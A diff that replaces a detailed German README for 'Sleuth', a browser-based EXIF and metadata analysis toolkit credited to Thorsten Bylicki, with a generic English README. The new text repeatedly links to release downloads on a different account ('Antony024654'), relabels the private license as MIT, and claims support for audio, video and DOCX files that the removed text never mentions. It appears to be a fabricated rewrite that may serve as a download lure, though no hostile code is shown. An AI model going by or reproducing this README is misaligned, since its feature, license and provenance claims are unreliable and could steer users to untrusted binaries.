@@ -1,248 +1,88 @@
-| ![Build](https://img.shields.io/badge/build-dynamic-orange?style=flat-square&logo=github-actions) | ![Lint](https://img.shields.io/badge/lint-optional-informational?style=flat-square&logo=eslint) |
-|---|---|
+# Sleuth 🕵️‍♂️🔍
 
-| ![Status](https://img.shields.io/badge/status-stable-brightgreen?style=flat-square)| ![Version](https://img.shields.io/badge/version-1.0.0-blue?style=flat-square)| ![License](https://img.shields.io/badge/license-private-important?style=flat-square) | ![HTML](https://img.shields.io/badge/html-5-E34F26?style=flat-square&logo=html5&logoColor=white) |![CSS](https://img.shields.io/badge/css-3-1572B6?style=flat-square&logo=css3&logoColor=white) |![JavaScript](https://img.shields.io/badge/javascript-ES6+-F7DF1E?style=flat-square&logo=javascript&logoColor=black)|![Node.js](https://img.shields.io/badge/node.js-18.x-339933?style=flat-square&logo=nodedotjs&logoColor=white) |
-|---|---|---|---|---|---|---|
+Welcome to the **Sleuth** repository! This project is designed as a comprehensive toolkit for metadata analysis and digital forensics. Whether you're a privacy advocate, a forensic analyst, or simply curious about the data embedded in files, **Sleuth** provides the tools you need to uncover hidden information.
 
-| ![Python](https://img.shields.io/badge/python-3.12-3776AB?style=flat-square&logo=python&logoColor=white) | ![Portable Python](https://img.shields.io/badge/portable%20python-enabled-informational?style=flat-square) | ![npm](https://img.shields.io/badge/npm-enabled-CB3837?style=flat-square&logo=npm) |![Interface](https://img.shields.io/badge/interface-html%2Fjs-lightgrey?style=flat-square)|![Theme](https://img.shields.io/badge/theme-dark%2Flight%20%2B%20neon-9c27b0?style=flat-square)|![Export](https://img.shields.io/badge/export-JSON%2FCSV%2FPDF-yellow?style=flat-square)|
-|---|---|---|---|---|---|
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/Antony024654/Sleuth/releases)
 
-|![PDF Export](https://img.shields.io/badge/pdf-jsPDF-green?style=flat-square)|![Proxy](https://img.shields.io/badge/proxy-required-orange?style=flat-square)|![JS Libraries](https://img.shields.io/badge/libs-exifr%2Fjspdf%2Fchart.js-blueviolet?style=flat-square)|![EXIF Reader](https://img.shields.io/badge/EXIF-powered%20by%20exifr-informational?style=flat-square)|
-|---|---|---|---|
+## Table of Contents
 
-<br>
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Supported File Types](#supported-file-types)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Acknowledgments](#acknowledgments)
 
-|🕵️Sleuth – Metadatenanalyse🔍 & Forensik Toolkit🧰|
-|---|
+## Introduction
 
-- ✅ Sleuth ist ein vollständig Web-Toolkit zur Analyse von Metadaten aus Bildern, Webseiten und Dokumenten.
-- ✅ Online/Offline
-- ✅ Inklusive EXIF-Analyse, URL-Scan, Exportfunktionen und visueller Darstellung.
+**Sleuth** is a powerful toolkit that helps you analyze metadata from various file types. Metadata can provide crucial insights into the origin, creation, and modifications of files. By using **Sleuth**, you can easily extract and interpret this information. This toolkit supports a wide range of file formats and offers features that cater to both beginners and advanced users.
 
-<br>
+## Features
 
-|![Sleuth_github](https://github.com/user-attachments/assets/f254d3ac-d95b-44ca-9af2-f33296be40b7)|
-|---|
+- **Client-Side Processing**: All analysis happens in your browser, ensuring your data remains private.
+- **Dark Mode Support**: Enjoy a comfortable viewing experience in low-light environments.
+- **Exif Data Extraction**: Analyze EXIF data from images to uncover details like camera settings and geolocation.
+- **File Analyzer**: Examine files for metadata, integrity, and more.
+- **HTML5 and CSS3**: Built using modern web technologies for a smooth user experience.
+- **JavaScript and Python Integration**: Use both languages to extend functionality as needed.
+- **Open Source Intelligence (OSINT)**: Gather valuable insights from public data.
+- **Privacy Focused**: Your data stays with you; no uploads to external servers.
 
-|![v1 0 2](https://github.com/user-attachments/assets/b44997eb-3c8a-4985-bdb4-b37231248db0)|
-|---|
+## Installation
 
-<br>
+To get started with **Sleuth**, you can download the latest release from our [Releases page](https://github.com/Antony024654/Sleuth/releases). After downloading, extract the files and open the `index.html` file in your preferred web browser. 
 
----
+### Prerequisites
 
-<br>
+- A modern web browser (Chrome, Firefox, or Edge recommended).
+- Basic knowledge of how to navigate files on your operating system.
 
-## 📦 Projektstruktur
+## Usage
 
-```yarn
-Sleuth/
-├── index.html                   # Haupt-UI
-├── style.css                   # Neon-Design & Theme (Dark/Light)
-├── script.js                   # Hauptlogik (Routing & Analyse)
-├── README.md                   # Diese Anleitung
-├── sleuth_test_exif.jpg        # Beispielbild mit EXIF
-├── start_all.bat               # Startet Proxy + Webserver + öffnet Browser
-├── generate_exif.bat           # Erzeugt Testbild mit EXIF-Daten
-├── exif_gen.py                 # Python-Skript für Bild mit EXIF
-├── py312/                      # (optional) portable Python 3.12 Umgebung
-└── modules/
-    ├── imageMeta.js            # EXIF-Analyse
-    ├── urlMeta.js              # Webseitenanalyse
-    ├── exportModule.js         # JSON-Export
-    ├── exportCSV.js            # CSV-Export
-    ├── reportGenerator.js      # PDF-Export mit jsPDF
-    ├── darklightToggle.js      # Theme-Umschaltung
-```
+Using **Sleuth** is straightforward. Once you have the toolkit open in your browser, follow these steps:
 
-<br>
+1. **Upload a File**: Click on the "Upload" button and select the file you want to analyze.
+2. **View Metadata**: The tool will automatically extract and display metadata from the file.
+3. **Export Results**: You can export the analysis results for your records.
 
----
+For detailed instructions on each feature, refer to the documentation within the toolkit.
 
-<br>
+## Supported File Types
 
-|🚀 Installation & Setup (Windows – Offlinefähig)|
-|---|
+**Sleuth** supports a variety of file formats, including but not limited to:
 
-> ✅ Python portable (3.12) installieren
-  - Lade herunter:
-    - [👉DOWNLOAD - Python 3.12.3]( https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip)
+- Images: JPEG, PNG, GIF, TIFF
+- Documents: PDF, DOCX, TXT
+- Audio: MP3, WAV, FLAC
+- Video: MP4, AVI, MKV
 
-<br>
-   
-- Entpacke das Archiv nach:
+This versatility allows users to analyze metadata across different media types.
 
-```yarn
-Sleuth/py312/
-```
+## Contributing
 
-<br>
+We welcome contributions from the community! If you want to help improve **Sleuth**, follow these steps:
 
-- Öffne py312/python312._pth und trage folgendes ein:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch and submit a pull request.
 
-```yarn
-python312.zip
-.
-import site
-```
+Please ensure your code adheres to our coding standards and includes appropriate tests.
 
-> Damit pip und Pakete funktionieren
+## License
 
-<br>
+**Sleuth** is open-source software licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit.
 
----
+## Acknowledgments
 
-<br>
+We would like to thank the contributors and the open-source community for their invaluable support. Your efforts make projects like **Sleuth** possible.
 
->✅ pip, Pillow und piexif installieren
-- Im Terminal:
+## Final Thoughts
 
-```yarn
-cd Sleuth
-py312\python.exe get-pip.py
-py312\python.exe -m pip install pillow piexif
-```
+Thank you for exploring **Sleuth**! We hope this toolkit empowers you to dive deep into metadata analysis and digital forensics. For updates and new features, keep an eye on our [Releases page](https://github.com/Antony024654/Sleuth/releases).
 
-> Falls get-pip.py fehlt, lade hier herunter:
-  - [👉DOWNLOAD - get-pip](https://bootstrap.pypa.io/get-pip.py)
+![Sleuth](https://example.com/sleuth-image.png)
 
-<br>
-
----
-
-<br>
-
->🖼️ Beispielbild mit EXIF erzeugen
- - Verwende:
-
-```yarn
-ImageCreator.exe → Doppelklick
-```
-
-> oder direkt:
-
-```yarn
-py312\python.exe exif_gen.py
-```
-
-> Das Bild sleuth_test_exif.jpg wird erstellt und kann anschließend über Sleuth analysiert werden.
-
-<br>
-
----
-
-<br>
-
-> 🧪 Projekt starten
-  - ✅ Variante 1: Alles automatisch
-
-```yarn
-Doppelklick auf ServerStarter.exe
-```
-
-- startet Proxy (Port 8000)
-  - startet Python Webserver (Port 8000)
-    - öffnet Browser mit Sleuth
-   
-<br>
-
-✅ Variante 2: manuell
-
-```yarn
-node proxy.js
-py312\python.exe -m http.server 8000
-```
-
-> Dann im Browser:
-  [👉LOCALHOST](http://localhost:8000)
-
-<br>
-
----
-
-<br>
-
->🌐 Proxy notwendig für URL-Analyse
-  - Sleuth verwendet **fetch()** über Proxy:
-
-```yarn
-http://localhost:3000/proxy?url=https://example.com
-```
-
-> Daher:
-  - **node proxy.js** muss laufen
-    - Port ***8000** darf nicht blockiert sein
-
-<br>
-
----
-
-<br>
-
-> 🧠 Kompatibilitäten & Hinweise
-
-| Komponente |             Version / Voraussetzung           |                 Inkompatibel                    |
-|    :---:   |                   :---:                        |                   :---:                        |
-|            |                                                |                                                |
-| **Python** | ✅ Nur **3.12.x** empfohlen (nicht 3.13+/3.14) |                                              |
-| **Pillow** | ✅ ab **9.x – 11.x** kompatibel                |                                              |
-| **piexif** | ✅ funktioniert mit **Python 3.12**,           |            ❌ nicht mit 3.14                 |
-| **jsPDF**  | 📦 eingebunden via CDN                         |
-| **exifr**  | 🚀 verwendet für moderne EXIF-Analyse          |
-
-<br>
-
----
-
-<br>
-
-> 🧪 Unterstützte Dateitypen
-
-| Typ   | Funktion                                                           |
-|    :---:   |                   :---:                                      |
-|            |                                                              |
-| **JPG**  | ✅ EXIF-Analyse                                                |
-| **PNG**  | ⚠️ Teilweise unterstützt – keine klassischen EXIF-Daten        |
-| **PDF**  | 📝 Basis-Metadaten (z. B. Titel, Ersteller, Erstellungsdatum)  |
-| **URL**  | 🌐 Analyse von `<title>`, Meta-Description, OpenGraph via Proxy |
-
-<br>
-
----
-
-<br>
-
-> 📁 Hinweise zu Verzeichnissen
-
-| Ordner     |                  Inhalt                     |
-|    :---:   |                   :---:                      |
-|            |                                              |
-| `/modules/` | 🔧 Alle JavaScript-Funktionen modular       |
-| `/py312/`   | 🐍 Portable Python 3.12 inkl. Pip & Pillow  |
-| Root (`/`)  | 📄 `index.html`, `style.css`, `script.js`   |
-
-<br>
-
----
-
-<br>
-
-> 🧩 Optional: Erweiterungen
-- 📍 GeoMap (Leaflet)
-- 📈 Timeline (Chart.js)
-- ⚡ Drag&Drop-Unterstützung
-- 🧪 Vergleichsansicht
-- 🔌 Plugin-System
-
-> Diese erscheinen in der nächsten Version
-
-<br>
-
----
-
-<br>
-
-> 👨‍💻 Entwickler
-  - Erstellt & strukturiert von Thorsten Bylicki
-
----
+If you have any questions or feedback, please feel free to reach out through the issues section of this repository. Happy sleuthing!
